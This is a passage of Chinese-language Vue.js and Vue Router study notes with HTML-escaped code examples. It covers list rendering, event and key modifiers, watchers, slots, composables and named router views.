6 7 \u0026lt;!-- 这会抛出一个错误，因为属性 todo 此时 没有在该实例上定义 --\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; v-if=\u0026#34;!todo.isComplete\u0026#34;\u0026gt; {{ todo.name }} \u0026lt;/li\u0026gt; 在外新包装一层 \u0026lt;template\u0026gt; 再在其上使用 v-for 可以解决这个问题 (这也更加明显易读)：\n1 2 3 4 5 \u0026lt;template v-for=\u0026#34;todo in todos\u0026#34;\u0026gt; \u0026lt;li v-if=\u0026#34;!todo.isComplete\u0026#34;\u0026gt; {{ todo.name }} \u0026lt;/li\u0026gt; \u0026lt;/template\u0026gt; 列表渲染 组件上使用 v-for 我们可以直接在组件上使用 v-for，和在一般的元素上使用没有区别 (别忘记提供一个 key)：\n1 \u0026lt;MyComponent v-for=\u0026#34;item in items\u0026#34; :key=\u0026#34;item.id\u0026#34; /\u0026gt; 但是，这不会自动将任何数据传递给组件，因为组件有自己独立的作用域。为了将迭代后的数据传递到组件中，我们还需要传递 props：\n1 2 3 4 5 6 \u0026lt;MyComponent v-for=\u0026#34;(item, index) in items\u0026#34; :item=\u0026#34;item\u0026#34; :index=\u0026#34;index\u0026#34; :key=\u0026#34;item.id\u0026#34; /\u0026gt; 不自动将 item 注入组件的原因是，这会使组件与 v-for 的工作方式紧密耦合。明确其数据的来源可以使组件在其他情况下重用。\n展示过滤或排序后的结果 有时，我们希望显示数组经过过滤或排序后的内容，而不实际变更或重置原始数据。在这种情况下，你可以创建返回已过滤或已排序数组的计算属性。\n举例来说：\n1 2 3 4 5 6 7 8 9 10 data() { return { numbers: [1, 2, 3, 4, 5] } }, computed: { evenNumbers() { return this.numbers.filter(n =\u0026gt; n % 2 === 0) } } 1 \u0026lt;li v-for=\u0026#34;n in evenNumbers\u0026#34;\u0026gt;{{ n }}\u0026lt;/li\u0026gt; 在计算属性不可行的情况下 (例如在多层嵌套的 v-for 循环中)，你可以使用以下方法：\n1 2 3 4 5 6 7 8 9 10 data() { return { sets: [[ 1, 2, 3, 4, 5 ], [6, 7, 8, 9, 10]] } }, methods: { even(numbers) { return numbers.filter(number =\u0026gt; number % 2 === 0) } } 1 2 3 \u0026lt;ul v-for=\u0026#34;numbers in sets\u0026#34;\u0026gt; \u0026lt;li v-for=\u0026#34;n in even(numbers)\u0026#34;\u0026gt;{{ n }}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; 在计算属性中使用 reverse() 和 sort() 的时候务必小心！这两个方法将变更原始数组，计算函数中不应该这么做。请在调用这些方法之前创建一个原数组的副本：\n1 2 - return numbers.reverse() + return [...numbers].reverse() 事件处理 在内联事件处理器中访问事件参数 有时我们需要在内联事件处理器中访问原生 DOM 事件。你可以向该处理器方法传入一个特殊的 $event 变量，或者使用内联箭头函数：\n1 2 3 4 5 6 7 8 9 \u0026lt;!-- 使用特殊的 $event 变量 --\u0026gt; \u0026lt;button @click=\u0026#34;warn(\u0026#39;Form cannot be submitted yet.\u0026#39;, $event)\u0026#34;\u0026gt; Submit \u0026lt;/button\u0026gt; \u0026lt;!-- 使用内联箭头函数 --\u0026gt; \u0026lt;button @click=\u0026#34;(event) =\u0026gt; warn(\u0026#39;Form cannot be submitted yet.\u0026#39;, event)\u0026#34;\u0026gt; Submit \u0026lt;/button\u0026gt; 1 2 3 4 5 6 7 8 9 methods: { warn(message, event) { // 这里可以访问 DOM 原生事件 if (event) { event.preventDefault() } alert(message) } } 事件修饰符 在处理事件时调用 event.preventDefault() 或 event.stopPropagation() 是很常见的。尽管我们可以直接在方法内调用，但如果方法能更专注于数据逻辑而不用去处理 DOM 事件的细节会更好。\n为解决这一问题，Vue 为 v-on 提供了事件修饰符。修饰符是用 . 表示的指令后缀，包含以下这些：\n.stop .prevent .self .capture .once .passive 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;!-- 单击事件将停止传递 --\u0026gt; \u0026lt;a @click.stop=\u0026#34;doThis\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;!-- 提交事件将不再重新加载页面 --\u0026gt; \u0026lt;form @submit.prevent=\u0026#34;onSubmit\u0026#34;\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;!-- 修饰语可以使用链式书写 --\u0026gt; \u0026lt;a @click.stop.prevent=\u0026#34;doThat\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;!-- 也可以只有修饰符 --\u0026gt; \u0026lt;form @submit.prevent\u0026gt;\u0026lt;/form\u0026gt; \u0026lt;!-- 仅当 event.target 是元素本身时才会触发事件处理器 --\u0026gt; \u0026lt;!-- 例如：事件处理器不来自子元素 --\u0026gt; \u0026lt;div @click.self=\u0026#34;doThat\u0026#34;\u0026gt;...\u0026lt;/div\u0026gt; TIP\n使用修饰符时需要注意调用顺序，因为相关代码是以相同的顺序生成的。因此使用 @click.prevent.self 会阻止元素及其子元素的所有点击事件的默认行为而 @click.self.prevent 则只会阻止对元素本身的点击事件的默认行为。\n按键修饰符 在监听键盘事件时，我们经常需要检查特定的按键。Vue 允许在 v-on 或 @ 监听按键事件时添加按键修饰符。\n1 2 \u0026lt;!-- 仅在 `key` 为 `Enter` 时调用 `submit` --\u0026gt; \u0026lt;input @keyup.enter=\u0026#34;submit\u0026#34; /\u0026gt; 你可以直接使用 KeyboardEvent.key 暴露的按键名称作为修饰符，但需要转为 kebab-case 形式。\n1 \u0026lt;input @keyup.page-down=\u0026#34;onPageDown\u0026#34; /\u0026gt; 在上面的例子中，仅会在 $event.key 为 'PageDown' 时调用事件处理。\n按键别名 Vue 为一些常用的按键提供了别名：\n.enter .tab .delete (捕获“Delete”和“Backspace”两个按键) .esc .space .up .down .left .right 系统按键修饰符 你可以使用以下系统按键修饰符来触发鼠标或键盘事件监听器，只有当按键被按下时才会触发。\n.ctrl .alt .shift .meta 注意\n在 Mac 键盘上，meta 是 Command 键 (⌘)。在 Windows 键盘上，meta 键是 Windows 键 (⊞)。在 Sun 微机系统键盘上，meta 是钻石键 (◆)。在某些键盘上，特别是 MIT 和 Lisp 机器的键盘及其后代版本的键盘，如 Knight 键盘，space-cadet 键盘，meta 都被标记为“META”。在 Symbolics 键盘上，meta 也被标识为“META”或“Meta”。\n举例来说：\n1 2 3 4 5 \u0026lt;!-- Alt + Enter --\u0026gt; \u0026lt;input @keyup.alt.enter=\u0026#34;clear\u0026#34; /\u0026gt; \u0026lt;!-- Ctrl + 点击 --\u0026gt; \u0026lt;div @click.ctrl=\u0026#34;doSomething\u0026#34;\u0026gt;Do something\u0026lt;/div\u0026gt; TIP\n请注意，系统按键修饰符和常规按键不同。与 keyup 事件一起使用时，该按键必须在事件发出时处于按下状态。换句话说，keyup.ctrl 只会在你仍然按住 ctrl 但松开了另一个键时被触发。若你单独松开 ctrl 键将不会触发。\n.exact 修饰符 .exact 修饰符允许控制触发一个事件所需的确定组合的系统按键修饰符。\n1 2 3 4 5 6 7 8 \u0026lt;!-- 当按下 Ctrl 时，即使同时按下 Alt 或 Shift 也会触发 --\u0026gt; \u0026lt;button @click.ctrl=\u0026#34;onClick\u0026#34;\u0026gt;A\u0026lt;/button\u0026gt; \u0026lt;!-- 仅当按下 Ctrl 且未按任何其他键时才会触发 --\u0026gt; \u0026lt;button @click.ctrl.exact=\u0026#34;onCtrlClick\u0026#34;\u0026gt;A\u0026lt;/button\u0026gt; \u0026lt;!-- 仅当没有按下任何系统按键时触发 --\u0026gt; \u0026lt;button @click.exact=\u0026#34;onClick\u0026#34;\u0026gt;A\u0026lt;/button\u0026gt; 鼠标按键修饰符 .left .right .middle 这些修饰符将处理程序限定为由特定鼠标按键触发的事件。\n生命周期 所有生命周期钩子函数的 this 上下文都会自动指向当前调用它的组件实例。注意：避免用箭头函数来定义生命周期钩子，因为如果这样的话你将无法在函数中通过 this 获取组件实例。\n有关所有生命周期钩子及其各自用例的详细信息，请参考生命周期钩子 API 索引。\n侦听器 深层侦听器 watch 默认是浅层的：被侦听的属性，仅在被赋新值时，才会触发回调函数——而嵌套属性的变化不会触发。如果想侦听所有嵌套的变更，你需要深层侦听器：\n1 2 3 4 5 6 7 8 9 10 11 12 export default { watch: { someObject: { handler(newValue, oldValue) { // 注意：在嵌套的变更中， // 只要没有替换对象本身， // 那么这里的 `newValue` 和 `oldValue` 相同 }, deep: true } } } 谨慎使用\n深度侦听需要遍历被侦听对象中的所有嵌套的属性，当用于大型数据结构时，开销很大。因此请只在必要时才使用它，并且要留意性能。\n即时回调的侦听器 watch 默认是懒执行的：仅当数据源变化时，才会执行回调。但在某些场景中，我们希望在创建侦听器时，立即执行一遍回调。举例来说，我们想请求一些初始数据，然后在相关状态更改时重新请求数据。\n我们可以用一个对象来声明侦听器，这个对象有 handler 方法和 immediate: true 选项，这样便能强制回调函数立即执行：\n1 2 3 4 5 6 7 8 9 10 11 12 13 export default { // ... watch: { question: { handler(newQuestion) { // 在组件实例创建时会立即调用 }, // 强制立即执行回调 immediate: true } } // ... } 模板引用 挂载结束后引用都会被暴露在 this.$refs 之上：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; export default { mounted() { this.$refs.input.focus() } } \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;input ref=\u0026#34;input\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; 注意，你只可以在组件挂载后才能访问模板引用。如果你想在模板中的表达式上访问 $refs.input，在初次渲染时会是 null。这是因为在初次渲染前这个元素还不存在呢！\n组件基础 大小写区分 HTML 标签和属性名称是不分大小写的，所以浏览器会把任何大写的字符解释为小写。这意味着当你使用 DOM 内的模板时，无论是 PascalCase 形式的组件名称、camelCase 形式的 prop 名称还是 v-on 的事件名称，都需要转换为相应等价的 kebab-case (短横线连字符) 形式：\n1 2 3 4 5 6 7 8 // JavaScript 中的 camelCase const BlogPost = { props: [\u0026#39;postTitle\u0026#39;], emits: [\u0026#39;updatePost\u0026#39;], template: ` \u0026lt;h3\u0026gt;{{ postTitle }}\u0026lt;/h3\u0026gt; ` } 1 2 \u0026lt;!-- HTML 中的 kebab-case --\u0026gt; \u0026lt;blog-post post-title=\u0026#34;hello!\u0026#34; @update-post=\u0026#34;onUpdatePost\u0026#34;\u0026gt;\u0026lt;/blog-post\u0026gt; 参考链接：\nDOM 模板解析注意事项\nProps Boolean 类型转换 为了更贴近原生 boolean attributes 的行为，声明为 Boolean 类型的 props 有特别的类型转换规则。以带有如下声明的 \u0026lt;MyComponent\u0026gt; 组件为例：\n1 2 3 4 5 export default { props: { disabled: Boolean } } 该组件可以被这样使用：\n1 2 3 4 5 \u0026lt;!-- 等同于传入 :disabled=\u0026#34;true\u0026#34; --\u0026gt; \u0026lt;MyComponent disabled /\u0026gt; \u0026lt;!-- 等同于传入 :disabled=\u0026#34;false\u0026#34; --\u0026gt; \u0026lt;MyComponent /\u0026gt; 事件 事件校验 和对 props 添加类型校验的方式类似，所有触发的事件也可以使用对象形式来描述。\n要为事件添加校验，那么事件可以被赋值为一个函数，接受的参数就是抛出事件时传入 this.$emit 的内容，返回一个布尔值来表明事件是否合法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 export default { emits: { // 没有校验 click: null, // 校验 submit 事件 submit: ({ email, password }) =\u0026gt; { if (email \u0026amp;\u0026amp; password) { return true } else { console.warn(\u0026#39;Invalid submit event payload!\u0026#39;) return false } } }, methods: { submitForm(email, password) { this.$emit(\u0026#39;submit\u0026#39;, { email, password }) } } } 配合 v-model 使用 https://cn.vuejs.org/guide/components/events.html#usage-with-v-model\n插槽 插槽内容与出口 在之前的章节中，我们已经了解到组件能够接收任意类型的 JavaScript 值作为 props，但组件要如何接收模板内容呢？在某些场景中，我们可能想要为子组件传递一些模板片段，让子组件在它们的组件中渲染这些片段。\n举例来说，这里有一个 \u0026lt;FancyButton\u0026gt; 组件，可以像这样使用：\n1 2 3 \u0026lt;FancyButton\u0026gt; Click me! \u0026lt;!-- 插槽内容 --\u0026gt; \u0026lt;/FancyButton\u0026gt; 而 \u0026lt;FancyButton\u0026gt; 的模板是这样的：\n1 2 3 \u0026lt;button class=\u0026#34;fancy-btn\u0026#34;\u0026gt; \u0026lt;slot\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;!-- 插槽出口 --\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;slot\u0026gt; 元素是一个插槽出口 (slot outlet)，标示了父元素提供的插槽内容 (slot content) 将在哪里被渲染。\n最终渲染出的 DOM 是这样：\n1 \u0026lt;button class=\u0026#34;fancy-btn\u0026#34;\u0026gt;Click me!\u0026lt;/button\u0026gt; 具名插槽 有时在一个组件中包含多个插槽出口是很有用的。举例来说，在一个 \u0026lt;BaseLayout\u0026gt; 组件中，有如下模板：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;header\u0026gt; \u0026lt;!-- 标题内容放这里 --\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;main\u0026gt; \u0026lt;!-- 主要内容放这里 --\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;footer\u0026gt; \u0026lt;!-- 底部内容放这里 --\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; 对于这种场景，\u0026lt;slot\u0026gt; 元素可以有一个特殊的 attribute name，用来给各个插槽分配唯一的 ID，以确定每一处要渲染的内容：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;header\u0026gt; \u0026lt;slot name=\u0026#34;header\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;main\u0026gt; \u0026lt;slot\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;footer\u0026gt; \u0026lt;slot name=\u0026#34;footer\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; 这类带 name 的插槽被称为具名插槽 (named slots)。没有提供 name 的 \u0026lt;slot\u0026gt; 出口会隐式地命名为“default”。\n在父组件中使用 \u0026lt;BaseLayout\u0026gt; 时，我们需要一种方式将多个插槽内容传入到各自目标插槽的出口。此时就需要用到具名插槽了：\n要为具名插槽传入内容，我们需要使用一个含 v-slot 指令的 \u0026lt;template\u0026gt; 元素，并将目标插槽的名字传给该指令：\n1 2 3 4 5 \u0026lt;BaseLayout\u0026gt; \u0026lt;template v-slot:header\u0026gt; \u0026lt;!-- header 插槽的内容放这里 --\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/BaseLayout\u0026gt; v-slot 有对应的简写 #，因此 \u0026lt;template v-slot:header\u0026gt; 可以简写为 \u0026lt;template #header\u0026gt;。其意思就是“将这部分模板片段传入子组件的 header 插槽中”。\n下面我们给出完整的、向 \u0026lt;BaseLayout\u0026gt; 传递插槽内容的代码，指令均使用的是缩写形式：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;BaseLayout\u0026gt; \u0026lt;template #header\u0026gt; \u0026lt;h1\u0026gt;Here might be a page title\u0026lt;/h1\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template #default\u0026gt; \u0026lt;p\u0026gt;A paragraph for the main content.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;And another one.\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;template #footer\u0026gt; \u0026lt;p\u0026gt;Here\u0026#39;s some contact info\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/BaseLayout\u0026gt; 当一个组件同时接收默认插槽和具名插槽时，所有位于顶级的非 \u0026lt;template\u0026gt; 节点都被隐式地视为默认插槽的内容。所以上面也可以写成：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;BaseLayout\u0026gt; \u0026lt;template #header\u0026gt; \u0026lt;h1\u0026gt;Here might be a page title\u0026lt;/h1\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;!-- 隐式的默认插槽 --\u0026gt; \u0026lt;p\u0026gt;A paragraph for the main content.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;And another one.\u0026lt;/p\u0026gt; \u0026lt;template #footer\u0026gt; \u0026lt;p\u0026gt;Here\u0026#39;s some contact info\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/BaseLayout\u0026gt; 现在 \u0026lt;template\u0026gt; 元素中的所有内容都将被传递到相应的插槽。最终渲染出的 HTML 如下：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1\u0026gt;Here might be a page title\u0026lt;/h1\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;main\u0026gt; \u0026lt;p\u0026gt;A paragraph for the main content.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;And another one.\u0026lt;/p\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;footer\u0026gt; \u0026lt;p\u0026gt;Here\u0026#39;s some contact info\u0026lt;/p\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; 作用域插槽 在上面的渲染作用域中我们讨论到，插槽的内容无法访问到子组件的状态。\n然而在某些场景下插槽的内容可能想要同时使用父组件域内和子组件域内的数据。要做到这一点，我们需要一种方法来让子组件在渲染时将一部分数据提供给插槽。\n我们也确实有办法这么做！可以像对组件传递 props 那样，向一个插槽的出口上传递 attributes：\n1 2 3 4 \u0026lt;!-- \u0026lt;MyComponent\u0026gt; 的模板 --\u0026gt; \u0026lt;div\u0026gt; \u0026lt;slot :text=\u0026#34;greetingMessage\u0026#34; :count=\u0026#34;1\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/div\u0026gt; 当需要接收插槽 props 时，默认插槽和具名插槽的使用方式有一些小区别。下面我们将先展示默认插槽如何接受 props，通过子组件标签上的 v-slot 指令，直接接收到了一个插槽 props 对象：\n1 2 3 \u0026lt;MyComponent v-slot=\u0026#34;slotProps\u0026#34;\u0026gt; {{ slotProps.text }} {{ slotProps.count }} \u0026lt;/MyComponent\u0026gt; 这类能够接受参数的插槽被称为作用域插槽 (scoped slots)，因为它们接受的参数只在该插槽作用域内有效。\n高级列表组件示例 1 2 3 4 5 6 7 8 \u0026lt;FancyList :api-url=\u0026#34;url\u0026#34; :per-page=\u0026#34;10\u0026#34;\u0026gt; \u0026lt;template #item=\u0026#34;{ body, username, likes }\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt; \u0026lt;p\u0026gt;{{ body }}\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;by {{ username }} | {{ likes }} likes\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;/FancyList\u0026gt; 在 \u0026lt;FancyList\u0026gt; 之中，我们可以多次渲染 \u0026lt;slot\u0026gt; 并每次都提供不同的数据 (注意我们这里使用了 v-bind 来传递插槽的 props)：\n1 2 3 4 5 \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;item in items\u0026#34;\u0026gt; \u0026lt;slot name=\u0026#34;item\u0026#34; v-bind=\u0026#34;item\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; 小提示：没有参数的 v-bind 会将一个对象的所有属性都作为 attribute 应用到目标元素上。\n依赖注入 一个父组件相对于其所有的后代组件，会作为依赖提供者。任何后代的组件树，无论层级有多深，都可以注入由父组件提供给整条链路的依赖。\n组合式函数 鼠标跟踪器示例 如果我们要直接在组件中使用组合式 API 实现鼠标跟踪功能，它会是这样的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;script setup\u0026gt; import { ref, onMounted, onUnmounted } from \u0026#39;vue\u0026#39; const x = ref(0) const y = ref(0) function update(event) { x.value = event.pageX y.value = event.pageY } onMounted(() =\u0026gt; window.addEventListener(\u0026#39;mousemove\u0026#39;, update)) onUnmounted(() =\u0026gt; window.removeEventListener(\u0026#39;mousemove\u0026#39;, update)) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt;Mouse position is at: {{ x }}, {{ y }}\u0026lt;/template\u0026gt; 但是，如果我们想在多个组件中复用这个相同的逻辑呢？我们可以把这个逻辑以一个组合式函数的形式提取到外部文件中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // mouse.js import { ref, onMounted, onUnmounted } from \u0026#39;vue\u0026#39; // 按照惯例，组合式函数名以“use”开头 export function useMouse() { // 被组合式函数封装和管理的状态 const x = ref(0) const y = ref(0) // 组合式函数可以随时更改其状态。 function update(event) { x.value = event.pageX y.value = event.pageY } // 一个组合式函数也可以挂靠在所属组件的生命周期上 // 来启动和卸载副作用 onMounted(() =\u0026gt; window.addEventListener(\u0026#39;mousemove\u0026#39;, update)) onUnmounted(() =\u0026gt; window.removeEventListener(\u0026#39;mousemove\u0026#39;, update)) // 通过返回值暴露所管理的状态 return { x, y } } 下面是它在组件中使用的方式：\n1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; import { useMouse } from \u0026#39;./mouse.js\u0026#39; const { x, y } = useMouse() \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt;Mouse position is at: {{ x }}, {{ y }}\u0026lt;/template\u0026gt; 约定和最佳实践 命名 组合式函数约定用驼峰命名法命名，并以“use”作为开头。\n输入参数 尽管其响应性不依赖 ref，组合式函数仍可接收 ref 参数。如果编写的组合式函数会被其他开发者使用，你最好在处理输入参数时兼容 ref 而不只是原始的值。unref() 工具函数会对此非常有帮助：\n1 2 3 4 5 6 7 import { unref } from \u0026#39;vue\u0026#39; function useFeature(maybeRef) { // 若 maybeRef 确实是一个 ref，它的 .value 会被返回 // 否则，maybeRef 会被原样返回 const value = unref(maybeRef) } 如果你的组合式函数在接收 ref 为参数时会产生响应式 effect，请确保使用 watch() 显式地监听此 ref，或者在 watchEffect() 中调用 unref() 来进行正确的追踪。\n返回值 你可能已经注意到了，我们一直在组合式函数中使用 ref() 而不是 reactive()。我们推荐的约定是==组合式函数始终返回一个包含多个 ref 的普通的非响应式对象==，这样该对象在组件中被解构为 ref 之后仍可以保持响应性：\n1 2 // x 和 y 是两个 ref const { x, y } = useMouse() 从组合式函数返回一个响应式对象会导致在对象解构过程中丢失与组合式函数内状态的响应性连接。与之相反，ref 则可以维持这一响应性连接。\n如果你更希望以对象属性的形式来使用组合式函数中返回的状态，你可以将返回的对象用 reactive() 包装一次，这样其中的 ref 会被自动解包，例如：\n1 2 3 const mouse = reactive(useMouse()) // mouse.x 链接到了原来的 x ref console.log(mouse.x) 1 Mouse position is at: {{ mouse.x }}, {{ mouse.y }} 自定义指令 directive\n1 \u0026lt;div v-color=\u0026#34;color\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; 1 2 3 4 app.directive(\u0026#39;color\u0026#39;, (el, binding) =\u0026gt; { // 这会在 `mounted` 和 `updated` 时都调用 el.style.color = binding.value }) 路由 捕获所有路由或 404 Not found 路由 常规参数只匹配 url 片段之间的字符，用 / 分隔。如果我们想匹配任意路径，我们可以使用自定义的 路径参数 正则表达式，在 路径参数 后面的括号中加入 正则表达式 :\n1 2 3 4 5 6 const routes = [ // 将匹配所有内容并将其放在 `$route.params.pathMatch` 下 { path: \u0026#39;/:pathMatch(.*)*\u0026#39;, name: \u0026#39;NotFound\u0026#39;, component: NotFound }, // 将匹配以 `/user-` 开头的所有内容，并将其放在 `$route.params.afterUser` 下 { path: \u0026#39;/user-:afterUser(.*)\u0026#39;, component: UserGeneric }, ] 路由的匹配语法 在参数中自定义正则 当定义像 :userId 这样的参数时，我们内部使用以下的正则 ([^/]+) (至少有一个字符不是斜杠 / )来从 URL 中提取参数。这很好用，除非你需要根据参数的内容来区分两个路由。想象一下，两个路由 /:orderId 和 /:productName，两者会匹配完全相同的 URL，所以我们需要一种方法来区分它们。最简单的方法就是在路径中添加一个静态部分来区分它们：\n1 2 3 4 5 6 const routes = [ // 匹配 /o/3549 { path: \u0026#39;/o/:orderId\u0026#39; }, // 匹配 /p/books { path: \u0026#39;/p/:productName\u0026#39; }, ] 但在某些情况下，我们并不想添加静态的 /o /p 部分。由于，orderId 总是一个数字，而 productName 可以是任何东西，所以我们可以在括号中为参数指定一个自定义的正则：\n1 2 3 4 5 6 const routes = [ // /:orderId -\u0026gt; 仅匹配数字 { path: \u0026#39;/:orderId(\\\\d+)\u0026#39; }, // /:productName -\u0026gt; 匹配其他任何内容 { path: \u0026#39;/:productName\u0026#39; }, ] 现在，转到 /25 将匹配 /:orderId，其他情况将会匹配 /:productName。routes 数组的顺序并不重要!\nTIP\n确保转义反斜杠( \\ )，就像我们对 \\d (变成\\\\d)所做的那样，在 JavaScript 中实际传递字符串中的反斜杠字符。\n编程式导航 想要导航到不同的 URL，可以使用 router.push 方法。这个方法会向 history 栈添加一个新的记录，所以，当用户点击浏览器后退按钮时，会回到之前的 URL。\n当你点击 \u0026lt;router-link\u0026gt; 时，内部会调用这个方法，所以点击 \u0026lt;router-link :to=\u0026quot;...\u0026quot;\u0026gt; 相当于调用 router.push(...) ：\n声明式 编程式 \u0026lt;router-link :to=\u0026quot;...\u0026quot;\u0026gt; router.push(...) 该方法的参数可以是一个字符串路径，或者一个描述地址的对象。例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 字符串路径 router.push(\u0026#39;/users/eduardo\u0026#39;) // 带有路径的对象 router.push({ path: \u0026#39;/users/eduardo\u0026#39; }) // 命名的路由，并加上参数，让路由建立 url router.push({ name: \u0026#39;user\u0026#39;, params: { username: \u0026#39;eduardo\u0026#39; } }) // 带查询参数，结果是 /register?plan=private router.push({ path: \u0026#39;/register\u0026#39;, query: { plan: \u0026#39;private\u0026#39; } }) // 带 hash，结果是 /about#team router.push({ path: \u0026#39;/about\u0026#39;, hash: \u0026#39;#team\u0026#39; }) 注意：如果提供了 path，params 会被忽略，上述例子中的 query 并不属于这种情况。取而代之的是下面例子的做法，你需要提供路由的 name 或手写完整的带有参数的 path ：\n1 2 3 4 5 6 7 8 9 const username = \u0026#39;eduardo\u0026#39; // 我们可以手动建立 url，但我们必须自己处理编码 router.push(`/user/${username}`) // -\u0026gt; /user/eduardo // 同样 router.push({ path: `/user/${username}` }) // -\u0026gt; /user/eduardo // 如果可能的话，使用 `name` 和 `params` 从自动 URL 编码中获益 router.push({ name: \u0026#39;user\u0026#39;, params: { username } }) // -\u0026gt; /user/eduardo // `params` 不能与 `path` 一起使用 router.push({ path: \u0026#39;/user\u0026#39;, params: { username } }) // -\u0026gt; /user 当指定 params 时，可提供 string 或 number 参数（或者对于可重复的参数可提供一个数组）。任何其他类型（如 undefined、false 等）都将被自动字符串化。对于可选参数，你可以提供一个空字符串（\u0026quot;\u0026quot;）来跳过它。\n由于属性 to 与 router.push 接受的对象种类相同，所以两者的规则完全相同。\nrouter.push 和所有其他导航方法都会返回一个 Promise，让我们可以等到导航完成后才知道是成功还是失败。我们将在 Navigation Handling 中详细介绍。\n命名视图 有时候想同时 (同级) 展示多个视图，而不是嵌套展示，例如创建一个布局，有 sidebar (侧导航) 和 main (主内容) 两个视图，这个时候命名视图就派上用场了。你可以在界面中拥有多个单独命名的视图，而不是只有一个单独的出口。如果 router-view 没有设置名字，那么默认为 default。\n1 2 3 \u0026lt;router-view class=\u0026#34;view left-sidebar\u0026#34; name=\u0026#34;LeftSidebar\u0026#34;\u0026gt;\u0026lt;/router-view\u0026gt; \u0026lt;router-view class=\u0026#34;view main-content\u0026#34;\u0026gt;\u0026lt;/router-view\u0026gt; \u0026lt;router-view class=\u0026#34;view right-sidebar\u0026#34; name=\u0026#34;RightSidebar\u0026#34;\u0026gt;\u0026lt;/router-view\u0026gt; 一个视图使用一个组件渲染，因此对于同个路由，多个视图就需要多个组件。确保正确使用 components 配置 (带上 s)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const router = createRouter({ history: createWebHashHistory(), routes: [ { path: \u0026#39;/\u0026#39;, components: { default: Home, // LeftSidebar: LeftSidebar 的缩写 LeftSidebar, // 它们与 `\u0026lt;router-view\u0026gt;` 上的 `name` 属性匹配 RightSidebar, }, }, ], }) 嵌套命名视图 我们也有可能使用命名视图创建嵌套视图的复杂布局。这时你也需要命名用到的嵌套 router-view 组件。我们以一个设置面板为例：\n1 2 3 4 5 6 7 8 9 /settings/emails /settings/profile +-----------------------------------+ +------------------------------+ | UserSettings | | UserSettings | | +-----+-------------------------+ | | +-----+--------------------+ | | | Nav | UserEmailsSubscriptions | | +------------\u0026gt; | | Nav | UserProfile | | | | +-------------------------+ | | | +--------------------+ | | | | | | | | | UserProfilePreview | | | +-----+-------------------------+ | | +-----+--------------------+ | +-----------------------------------+ +------------------------------+ Nav 只是一个常规组件。 UserSettings 是一个视图组件。 UserEmailsSubscriptions、UserProfile、UserProfilePreview 是嵌套的视图组件。 注意：我们先忘记 HTML/CSS 具体的布局的样子，只专注在用到的组件上。\nUserSettings 组件的 \u0026lt;template\u0026gt; 部分应该是类似下面的这段代码:\n1 2 3 4 5 6 7 \u0026lt;!-- UserSettings.vue --\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;User Settings\u0026lt;/h1\u0026gt; \u0026lt;NavBar /\u0026gt; \u0026lt;router-view /\u0026gt; \u0026lt;router-view name=\u0026#34;helper\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; 那么你就可以通过这个路由配置来实现上面的布局：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 { path: \u0026#39;/settings\u0026#39;, // 你也可以在顶级路由就配置命名视图 component: UserSettings, children: [{ path: 